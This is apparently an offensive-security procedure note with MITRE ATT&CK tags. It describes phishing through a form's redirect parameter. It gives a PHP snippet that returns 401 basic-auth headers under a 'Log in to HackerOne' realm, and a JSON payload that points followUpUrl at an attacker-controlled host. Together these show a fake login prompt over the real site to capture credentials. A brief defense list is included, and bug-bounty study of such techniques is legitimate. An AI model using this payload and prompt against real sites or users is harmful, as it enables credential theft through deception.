---
tags:
  - phishing
  - redirect
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/header-www-authenticate]]'
  - '[[commands/header-http-401-unauthorized]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 8ae7ae2a-4bdc-4477-ba2c-c4ffbf8be9a6
created_at: '2025-12-13T23:56:20.043Z'
updated_at: '2025-12-13T23:56:20.043Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate Phishing via Redirect

## Summary

This procedure demonstrates a phishing attack by redirecting the user to a malicious URL that triggers a basic auth prompt, mimicking the target's login to steal credentials.

## Description

By setting followUpUrl to an attacker-controlled page that returns 401 headers, the browser displays an auth dialog with the original site in the background, effective in browsers like Firefox and Edge despite CSP.

## Requirements

1. Attacker-controlled server hosting the phishing page
2. Crafted payload from prior steps
3. Target user interacting with the form

## Defense

Defensive measures and detection strategies:

- Validate and sanitize redirect URLs
- Use CSP frame-ancestors to prevent framing
- Educate users on unexpected auth prompts

## Objectives

1. Trigger redirect to phishing site
2. Display fake login prompt
3. Potential credential capture

## Instructions

### Step 1: Set Up Phishing Page

**Context**: Create a PHP script that sends auth headers.

Host 401.php on attacker server with [[commands/header-www-authenticate]] and [[commands/header-http-401-unauthorized]].

```php
header('WWW-Authenticate: Basic realm="Log in to HackerOne"');
header('HTTP/1.0 401 Unauthorized');
```

> Triggers browser auth dialog.

### Step 2: Modify Payload for Redirect

**Context**: Update the followUpUrl to point to the phishing page.

Set followUpUrl to https://attacker.sometld/401.php in the JSON payload.

```json
{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"https://attacker.sometld/401.php","aliId":17144124}}}
```

> Redirects user to phishing prompt.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/header-www-authenticate]]
- [[commands/header-http-401-unauthorized]]

## Tools Used



## Tags

- [[Phishing]]
- [[redirect]]
